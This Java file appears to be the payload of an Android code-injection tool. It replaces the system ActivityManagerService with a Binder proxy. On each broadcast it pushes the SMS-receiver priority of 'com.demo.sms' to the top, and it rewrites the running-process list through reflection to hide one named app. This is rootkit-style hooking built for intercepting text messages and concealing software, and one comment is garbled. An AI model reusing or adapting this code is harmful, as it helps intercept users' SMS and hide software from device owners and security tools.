package com.elf.inject;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Binder;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.os.UserHandle;
import android.util.Log;

/**
 * 
 * @author boyliang
 * 
 */
public final class EntryClass {

	private static final class ProxyActivityManagerServcie extends Binder {

		private static final String CLASS_NAME = "android.app.IActivityManager";
		private static final String SERVERVICES_CLASSNAME = "com.android.server.am.ActivityManagerService";
		private static final int s_broadcastIntent_code;
		private static final int s_getrunningapps_code;
		private SmsReceiverResorter mResorter;
		private static List<?> mList;
		private static Class mProcessRecord;
		private static List mLruProcesses;
		private static Class mManagerService;
		static {
			if (ReflecterHelper.setClass(CLASS_NAME)) {
				s_broadcastIntent_code = ReflecterHelper.getStaticIntValue(
						"BROADCAST_INTENT_TRANSACTION", -1);
				s_getrunningapps_code = ReflecterHelper.getStaticIntValue(
						"GET_RUNNING_APP_PROCESSES_TRANSACTION", -1);
			} else {
				s_broadcastIntent_code = -1;
				s_getrunningapps_code = -1;
			}

			try {
				mProcessRecord = Class
						.forName("com.android.server.am.ProcessRecord");

			} catch (Exception e) {
				// TODO Auto-generated catch block
				Log.e("TTT", e.toString());
				// e.printStackTrace();
			}
		}

		private IBinder mBinder;

		public ProxyActivityManagerServcie(IBinder binder) {

			mBinder = binder; // 返回AMS
			mResorter = new SmsReceiverResorter(binder);
		}

		@Override
		protected boolean onTransact(int code, Parcel data, Parcel reply,
				int flags) throws RemoteException {

			if (code == s_broadcastIntent_code) {
				// Log.i("TTT", "broadcastintent:"+s_broadcastIntent_code);
				mResorter.updatePriority("com.demo.sms");
			}

			if (code == s_getrunningapps_code) // 从这里开始调用服�[0m
			{
				data.enforceInterface("android.app.IActivityManager");
				List<ActivityManager.RunningAppProcessInfo> list = null;
				try {
					list = getRunningAppProcesses();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					Log.e("TTT", e.toString());
				}
				reply.writeNoException();
				reply.writeTypedList(list);
				return true;
			}
			return mBinder.transact(code, data, reply, flags);
		}

		private List<RunningAppProcessInfo> getRunningAppProcesses()
				throws Exception { //
			List<ActivityManager.RunningAppProcessInfo> runList = null;

			synchronized (this) {
				// Iterate across all processes
				Field mFileLruProcesses = mBinder.getClass().getDeclaredField(
						"mLruProcesses");
				mFileLruProcesses.setAccessible(true);
				List mLruProcesses = (List) mFileLruProcesses.get(mBinder);

				for (int i = mLruProcesses.size() - 1; i >= 0; i--) {

					Object app = mLruProcesses.get(i);

					// Log.i("TTT","app  is  "+app.toString());

					Field mthread = app.getClass().getDeclaredField("thread");
					mthread.setAccessible(true);
					Object thread = mthread.get(app);

					// Log.i("TTT","thread  is  "+thread.toString());

					Field mCrashing = app.getClass().getDeclaredField(
							"crashing");
					mCrashing.setAccessible(true);
					boolean crashing = mCrashing.getBoolean(app);

					// Log.i("TTT","crashing  is  "+crashing);

					Field mnotResponding = app.getClass().getDeclaredField(
							"notResponding");
					mnotResponding.setAccessible(true);
					boolean notResponding = mnotResponding.getBoolean(app);

					// Log.i("TTT","notResponding  is  "+notResponding);

					if ((thread != null) && (!crashing && !notResponding)) {

						Field mprocessName = app.getClass().getDeclaredField(
								"processName");
						mprocessName.setAccessible(true);
						String processName = (String) mprocessName.get(app);

						if (processName == "com.cyjh.mobileanjian")
							continue;

						// Log.i("TTT","processName  is  "+processName);

						Field mpid = app.getClass().getDeclaredField("pid");
						mpid.setAccessible(true);
						int pid = mpid.getInt(app);

						// Log.i("TTT","pid  is  "+pid);

						String[] list = (String[]) ReflecterHelper
								.invokeMethod(app, "getPackageList", null);

						// if(list == null)
						// {
						// Log.i("TTT", "list is null!!");
						// }else
						// {
						// Log.i("TTT", "list size is "+list.length);
						// }
						// Generate process state info for running application
						ActivityManager.RunningAppProcessInfo currApp = new ActivityManager.RunningAppProcessInfo(
								processName, pid, list);
						// if(currApp == null)
						// {
						// Log.i("TTT", "currApp is null!!");
						//
						// }else
						// {
						// Log.i("TTT", "currApp size is "+currApp.toString());
						// }
						// fillInProcMemInfo(app, currApp);
						// if (app.adjSource instanceof ProcessRecord) {
						// currApp.importanceReasonPid = ((ProcessRecord)
						// app.adjSource).pid;
						// currApp.importanceReasonImportance =
						// oomAdjToImportance(app.adjSourceOom, null);
						// } else if (app.adjSource instanceof ActivityRecord) {
						// ActivityRecord r = (ActivityRecord) app.adjSource;
						// if (r.app != null)
						// currApp.importanceReasonPid = r.app.pid;
						// }
						// if (app.adjTarget instanceof ComponentName) {
						// currApp.importanceReasonComponent = (ComponentName)
						// app.adjTarget;
						// }

						if (runList == null) {
							runList = new ArrayList<ActivityManager.RunningAppProcessInfo>();
						}
						runList.add(currApp);
					}
				}
			}
			return runList;
		}
	}

	public static Object[] invoke() {
		IBinder activity_proxy = null;
		IBinder package_proxy = null;
		try {
			activity_proxy = new ProxyActivityManagerServcie(
					ServiceManager.getService("activity"));

		} catch (Exception e) {
			e.printStackTrace();
		}

		return new Object[] { "activity", activity_proxy};
	}
}